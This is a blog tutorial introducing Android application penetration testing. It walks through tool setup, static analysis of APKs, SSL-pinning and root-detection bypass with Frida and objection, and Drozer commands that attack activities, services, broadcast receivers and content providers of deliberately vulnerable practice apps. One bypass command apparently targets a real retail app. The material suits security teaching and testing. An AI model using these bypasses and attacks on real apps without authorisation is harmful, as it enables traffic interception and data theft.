---
layout: post
title: Mobile Security
author: Rajat Rao
date: '2020-06-10 14:35:23 +0530'
category:
        - HackTheBox
summary: Beginners guide to mobile security (Android).
thumbnail: /assets/img/posts/mobile_security.png
---

<style>
* {
  box-sizing: border-box;
}

.column {
  float: left;
  width: 33.33%;
  padding: 5px;
}

row::after {
  content: "";
  clear: both;
  display: table;
}
</style>

As security audit of web application are performed for multiple organization, a draw of interest can be made in Mobile applications as well.

The primary objective for a mobile application penetration test is to identify exploitable vulnerabilities in code, system, network, application, databases, Api's etc before hackers are able to discover and exploit them. Application penetration testing will reveal real-world opportunities for hackers to be able to compromise application and databases in such a way that allows for unauthorized access to sensitive data or even take-over application for malicious/non-business purposes.

Android Penetration testing can be implemented in any organization:

`1)Static:` Checks with respect to code levels will be performed

`2)Network:` Intercepting the request sent by the android application and interaction between the application and server is audited.

`3)Interactive:` While the applications provide its service, they tend to store a lot of confidential data in the respective mobile device itselfdynamically. An audit of the internal storage of the device is performed.
	
	
The Mobile Security Series will be divided into the following chapters:


* [Chapter 1: Android Application Fundamentals]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter1)

* [Chapter 2: Setup Mobile Testing Platform]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter2) 

* [Chapter 3: Static Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter3)	

* [Chapter 4: Dynamic Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter4)

* [Chapter 5: Interactive Analysis]({{site.url}}/hackthebox/2020/06/10/Mobile-Security/#chapter5)

<p id="chapter2">&nbsp;</p>

<h2 id="chapter2">Chapter 2: Setup Mobile Testing Platform  </h2>

Setting up an environment for any security assessment is a must. For Android Security, it is suggested to be dependent more on Kali Linux/Tamer operating system. <b>Kali Linux</b> is an advanced penetration testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments.<b>Android Tamer</b> is a virtual/live platform for Android Security professionals where all the tools are inculcated within the OS. 

The very first step is to install Virtual Kali Linux/Android Tamer on Vmware. Following is the list of useful URLs for downloads:

<b>VMware</b>: [https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html](https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html)

<b>Kali Linux</b>: [https://www.kali.org/downloads/](https://www.kali.org/downloads/)

<b>Android Tamer</b>: [https://androidtamer.com/tamer4-release](https://androidtamer.com/tamer4-release)

For newbies into cyber security, we'll be creating content for installation steps for <b>VMWare</b> and <b>virtual machines</b> (.iso and .ova)

For assessing Mobile application, we need a dedicated android testing device to perform assessments. However, the same can be performed by creating a virtual Android environment with the help of a tool named Genymotion. It is a Cross-platform Android Emulator for developers & QA engineers. It is dependent on VirtualBox. Following is the list of URL for downloads-

<b>VirtualBox</b>: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)

<b>Genymotion</b>: [https://www.genymotion.com/fun-zone/](https://www.genymotion.com/fun-zone/)    
     
&nbsp;
      
<h3>2.1 || Genymotion</h3>

--> `Start Genymotion`

![deploy using travis](/assets/img/posts/Mobile_Security/1.png){:class="img-fluid"}

--> `Add Virtual Device`

![deploy using travis](/assets/img/posts/Mobile_Security/2.png){:class="img-fluid"}

--> `Select Google Pixel XL with API >=6.0 and click Next`

![deploy using travis](/assets/img/posts/Mobile_Security/3.png){:class="img-fluid"}

--> `Install the selected emulator`

![deploy using travis](/assets/img/posts/Mobile_Security/4.png){:class="img-fluid"}


![deploy using travis](/assets/img/posts/Mobile_Security/5.png){:class="img-fluid"}  

&nbsp;

<h3>2.2 || Required tools</h3>

Once genymotion is installed, the next step for android security assessments is to setup following list of tools in <b>Kali Linux</b>:

<b>Mobsf (Docker)</b>: [https://github.com/MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) 

<b>Drozer</b>: [https://github.com/FSecureLABS/drozer/releases](https://github.com/FSecureLABS/drozer/releases) 

<b>Superanalyzer</b>: [https://github.com/FSecureLABS/drozer/releases](https://github.com/FSecureLABS/drozer/releases)  
  
<p id="chapter3">&nbsp;</p>

<h2>Chapter 3: Static Analysis  </h2>

Static Application Security Testing is a set of technologies designed to analyze the application source code that are indicative of security vulnerabilities. Now as required tools are installed, we can start with security assessment of Android Applications/

<h3>3.1 || Mobsf (Docker)</h3>

<b>Mobile Security Framework (MobSF)</b> is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware-analysis and security assessment framework capable of performing static and dynamic analysis.

In this section of <b>Mobsf</b>, we’ll be focusing more on static analysis.

--> `Start mobsf via Docker`

```yml
$ git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
$ cd Mobile-Security-Framework-MobSF
$ docker build -t mobsf .
$ docker run -it -p 8000:8000 mobsf
```
--> `Upload and Scan APK`

![deploy using travis](/assets/img/posts/Mobile_Security/6.png){:class="img-fluid"}  

![deploy using travis](/assets/img/posts/Mobile_Security/7.png){:class="img-fluid"}  

  &nbsp; 
  
<h3>3.2 || Superanalyzer </h3>

--> `Run Superanalyzer against APK`

```yml
$ super-analyzer -v goatdroid.apk
```
The output of the super-anaylzer is stored in the form of HTML and can view defects found with respect to the application.

![deploy using travis](/assets/img/posts/Mobile_Security/8.png){:class="img-fluid"}  

  &nbsp; 
  
<h3>3.3 || d2j-dex2jar & jd-gui </h3>
	
<b>d2j-dex2jar</b> tool helps one to reverse engineer the apk to jar version of it. The jar version helps to displays the code and can be examined for security purposes.

```yml
$d2j-dex2jar goatdroid.apk
$jd-gui → select jar file of goatdroid apk
```
![deploy using travis](/assets/img/posts/Mobile_Security/9.png){:class="img-fluid"}  

<p id="chapter4">&nbsp;</p>

<h2>Chapter 4: Network Analysis </h2>

Network analysis deals with communication of application with the server providing data. Here, analysis is done similarly the way analysis of web application is done by setting a proxy and intercepting every request to <b>Burpsuite</b>.

<h3>4.1 || Setup Proxy in Mobile </h3>

<div class="row">
  <div class="column">
    <img src="/assets/img/posts/Mobile_Security/10.png" alt="Snow" style="width:100%">
    <figcaption style="text-align: center;">Fig.1 </figcaption>

  </div>
  <div class="column">
    <img src="/assets/img/posts/Mobile_Security/11.png" alt="Forest" style="width:100%">
    <figcaption style="text-align: center;">Fig.2 </figcaption>
  </div>
  <div class="column">
    <img src="/assets/img/posts/Mobile_Security/12.png" alt="Mountains" style="width:100%">
    <figcaption style="text-align: center;">Fig.3 </figcaption>
  </div>
</div> 

  &nbsp; 

<h3>4.2 || SSL Pinning and Root Detection Bypass </h3>

Here, SSL Pinning allows the application to only trust the valid or pre-definedcertificate or Public Key. The application developer uses SSL Pinning technique as an additional layer for application traffic.

Below we are going to discuss about steps to bypass SSL Pinning.

--> `Install Frida`

```yml
$ pip3 install frida
$ pip3 install objection
$ pip3 install frida-tools
```
Download the fridascript.js script for hooking from the following link:[https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/](https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/)

--> `Connect Device to ADB`

```yml
$ adb connect 192.18.0.105:5555
$ adb devices (To check connected devices)
```
--> `Find and Install Target application (Frida server) in device`

```yml
$ adb shell getprop ro.product.cpu.abi (To check architecture of device)
```
Download the Frida Server script according to above command output from the following link: [https://github.com/frida/frida/releases/](https://github.com/frida/frida/releases/)

--> `Push Frida Server to device`

```yml
$ adb push frida-server-12.8.14-android-x86 /data/local/tmp
$ adb shell chmod 777 /data/local/tmp/frida-server-12.8.14-android-x86
```
--> `Bypass SSL pinning & Root Detection`

```yml
$ adb push fridascript.js /data/local/tmp
$ adb shell /data/local/tmp/frida-server-12.8.14-android-x86 & (Running frida server)
$ frida-ps -u (Check running processes in device)
$ objection –gadget com.ril.ajio explore → android sslpinning disable/android root
disable(For bypassing Root Detection)
```

<p id="chapter5">&nbsp;</p>

<h2 >Chapter 5: Interactive Analysis </h2>

Interactive Anaylysis can also be called as **Ineteractive Application Security Assessment (IAST)**. It is basically combination **Static Application Security Assessment (SAST)** and **Dynamic Application Security Assessment (DAST)**. In layman terms, **DAST** deals at interactive level .i.e at runtime level where the application is performing it's functionality. Following is the list of methods that can used in **DAST** methodology:

<h3>5.1 || Drozer </h3>

Drozer provides tools to help you use and share public exploits for android. It is primarily used to assess following components in Android:

- **Content Provider**: It supplies data from one application to another. It can store the data in the file system, a SQLite Database, or the web, or any persistent storage location your app can access. It is used to share data among applications via queries such as insert(), update(), delete() and query()

- **Activity**: An activity represents a single screen with a user interface. For example, a login page can be called as an activity

- **Services**: A service is a component that runs in the background to perform long-running operations or to perform for remote processes and it does not have user interface. For example, Maps service running in the background.

- **Broadcast Receivers**: A broadcast receiver is a component that responds to system-wide broadcast announcements

Let’s move on to usage of drozer

--> `Install drozer agent in client`

![deploy using travis](/assets/img/posts/Mobile_Security/13.png){:class="img-fluid"}


--> `Activate Drozer Agent`

![deploy using travis](/assets/img/posts/Mobile_Security/14.png){:class="img-fluid"}

--> `Connect to Drozer Agent via below command`

```yml
$ adb forward tcp:31415 tcp:31415
$ drozer console connect
```

![deploy using travis](/assets/img/posts/Mobile_Security/15.png){:class="img-fluid"}

--> `Atacking Activities`

```yml
$ run app.activity,info -a org.owasp.goatdroid.fourgoats
```

![deploy using travis](/assets/img/posts/Mobile_Security/16.png){:class="img-fluid"}

```yml
$ run app.activity.start –-component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.activities.ViewProfile
```
![deploy using travis](/assets/img/posts/Mobile_Security/17.png){:class="img-fluid"}

--> `Atacking Services`

```yml
$ run app.service.info -a org.owasp.goatdroid.fourgoats
```

![deploy using travis](/assets/img/posts/Mobile_Security/18.png){:class="img-fluid"}

```yml
$ run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService
```

![deploy using travis](/assets/img/posts/Mobile_Security/19.png){:class="img-fluid"}


--> `Atacking Broadcast Receivers`

```yml
$ run app.package.info -a org.owasp.goatdroid.fourgoats
```

![deploy using travis](/assets/img/posts/Mobile_Security/20.png){:class="img-fluid"}

To exploit SendSMSNowReceiver, we need to check corresponding action name in AndroidManifest.xml file which can be extracted with the help of apktool command. Following is the command to run:

```yml
$ apktool d goatdroid.apk
```

![deploy using travis](/assets/img/posts/Mobile_Security/21.png){:class="img-fluid"}

To call the broadcast receiver, we need to send few parameters which can be found in decompiled jar version as explained in dex2jar chapter.

![deploy using travis](/assets/img/posts/Mobile_Security/22.png){:class="img-fluid"}

Following command triggers Broadcast receivers: 

```yml
$ run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234 --extra string message "Hey!"
```

![deploy using travis](/assets/img/posts/Mobile_Security/23.png){:class="img-fluid"}

![deploy using travis](/assets/img/posts/Mobile_Security/24.png){:class="img-fluid"}


--> `Atacking Content Providers`

```yml
$ run app.provider.finduri com.mwr.example.sieve
```

![deploy using travis](/assets/img/posts/Mobile_Security/25.png){:class="img-fluid"}

```yml
$ run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
```

![deploy using travis](/assets/img/posts/Mobile_Security/26.png){:class="img-fluid"}



